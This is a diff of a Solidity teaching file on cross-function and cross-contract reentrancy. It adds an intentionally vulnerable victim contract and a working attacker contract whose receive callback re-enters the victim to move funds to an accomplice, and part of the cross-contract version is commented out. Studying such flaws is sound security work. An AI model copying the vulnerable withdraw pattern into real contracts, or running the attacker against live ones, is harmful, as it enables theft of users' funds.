@@ -16,13 +16,21 @@ pragma solidity ^0.8.18;
  * @notice type 3 CROSS-CONTRACT REENTRANCY
  * NOTE send() and transfer() are safe against reentrancy
  */
+import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 
-contract ReentrancyVictim {
+/**
+ * -------------------------------------------------------------------------------------
+ * 1. Victim contract First Cross Attack: Cross Function
+ * -------------------------------------------------------------------------------------
+ */
+
+contract ReentrancyVictimFunction {
     error ReentrancyVictim_balanceIsLow();
     error ReentrancyVictim_callFailed();
 
     mapping(address => uint256) public balances;
-    uint256 public currentBalance;
 
     function deposit() public payable {
         balances[msg.sender] += msg.value;
@@ -62,28 +70,101 @@ contract ReentrancyVictim {
     }
 }
 
+/**
+ * -------------------------------------------------------------------------------------
+ * 2. Victim contract Second Cross Attack: Cross Contract
+ * -------------------------------------------------------------------------------------
+ */
+contract OkToken is Ownable {
+    mapping(address => uint256) public balance; // the problematic shared state variable e.g. balances
+
+    constructor() Ownable(msg.sender) {}
+}
+
+// contract ReentrancyVictimContract is ReentrancyGuard {
+//     OkToken oktoken;
+//     uint256 public contractBalance;
+//     uint256 public attackerBalance;
+
+//     constructor() {}
+
+//     function deposit() external payable {}
+
+//     /* 
+//      * Identical as in ReentrancyVictimFunction, 
+//      * except we call a function (burn) instead of modifying the state (balances)
+//      * 
+//      * The reentrancy guard does not prevent the attack
+//      * Bad use of CEI > burn is after sending tokens (CIE)
+//      */
+
+//     function withdraw() external payable nonReentrant {
+//         uint256 balance = oktoken.balanceOf(msg.sender);
+//         require(balance > 0, "Insufficient balance");
+
+//         //call will fail if no receive function exists in the receiving contract (attacker)
+//         (bool success,) = msg.sender.call{value: balance}("");
+//         require(success, "Failed to send Ether");
+
+//         success = oktoken.burn(msg.sender, balance); // now sender does not have a balance to burn
+//         require(success, "Failed to burn token");
+//     }
+
+//     function getOkToken() public view returns (OkToken) {
+//         return oktoken;
+//     }
+// }
+
+/**
+ * -------------------------------------------------------------------------------------
+ * 3. Attacker contract for both Reentrancy Cross attacks
+ * -------------------------------------------------------------------------------------
+ */
+
 contract ReentrancyAttacker {
-    ReentrancyVictim immutable victim;
+    ReentrancyVictimFunction immutable victimFunction;
+    // ReentrancyVictimContract immutable victimContract;
     address immutable accomplice;
+    CrossAttackType currentAttackType;
+
+    enum CrossAttackType {
+        FUNCTION,
+        CONTRACT
+    }
 
     error ReentrancyAttacker_sendingNotEnoughEthers();
 
-    constructor(address _victim, address _accomplice) {
-        victim = ReentrancyVictim(_victim);
+    constructor(address _victimFunction, address _victimContract, address _accomplice) {
+        victimFunction = ReentrancyVictimFunction(_victimFunction);
+        // victimContract = ReentrancyVictimContract(_victimContract);
         accomplice = _accomplice;
     }
 
-    function attack() external payable {
-        if (
-            msg.value < 1 ether //
-        ) revert ReentrancyAttacker_sendingNotEnoughEthers();
-        victim.deposit{value: msg.value}();
-        victim.withdraw(); // calls a receive / fallback
+    function attack(CrossAttackType attackType) external payable {
+        currentAttackType = attackType;
+        if (msg.value < 1 ether) revert ReentrancyAttacker_sendingNotEnoughEthers();
+        if (attackType == CrossAttackType.FUNCTION) {
+            victimFunction.deposit{value: msg.value}();
+            victimFunction.withdraw(); // calls a receive / fallback
+        }
+        // if (attackType == CrossAttackType.CONTRACT) {
+        //     victimContract.deposit{value: msg.value}();
+        //     victimContract.withdraw(); // calls a receive / fallback
+        // }
     }
 
     receive() external payable {
-        if (address(victim).balance >= msg.value) {
-            victim.transfer(accomplice, 1 ether);
+        // the attacker's token has not been burn: he can transfer it to carl
+        if (currentAttackType == CrossAttackType.FUNCTION) {
+            if (address(victimFunction).balance >= msg.value) {
+                victimFunction.transfer(accomplice, 1 ether);
+            }
         }
+        // if (currentAttackType == CrossAttackType.CONTRACT) {
+        //     if (address(victimContract).balance >= msg.value) {
+        //         victimContract.getOkToken().transfer(accomplice, 1 ether); // this
+        //     }
+        // }
     }
+
 }
